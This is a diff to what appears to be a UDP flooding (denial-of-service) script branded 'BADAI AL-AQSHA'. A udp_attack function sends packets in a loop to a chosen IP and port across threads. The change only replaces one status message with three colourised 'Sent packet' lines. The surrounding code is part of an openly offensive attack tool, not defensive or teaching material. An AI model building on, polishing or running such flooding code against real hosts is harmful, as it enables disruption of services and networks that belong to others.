@@ -71,7 +71,9 @@ def udp_attack(ip, port, packet, duration, thread_count):
         try:
             for _ in range(packet):
                 s.sendto(data, (ip, port))
-            print(f"\033[33m[BADAI AL-AQSHA] Attacking... >  time {duration} target {ip}:{port} packet {packet} threads {thread_count}\033[0m")
+            print(f"  \033[92mBADAI AL-AQSHA   \033[97mSent packet:. " +ip+ "\033[0m" )
+            print(f"  \033[31mBADAI AL-AQSHA   \033[33mSent packet:. " +ip+ "\033[0m" )
+            print(f"  \033[95mBADAI AL-AQSHA   \033[91mSent packet:. " +ip+ "\033[0m" )
         except socket.error:
             s.close()
             print("[BADAI AL-AQSHA] Error during attack, socket closed.")
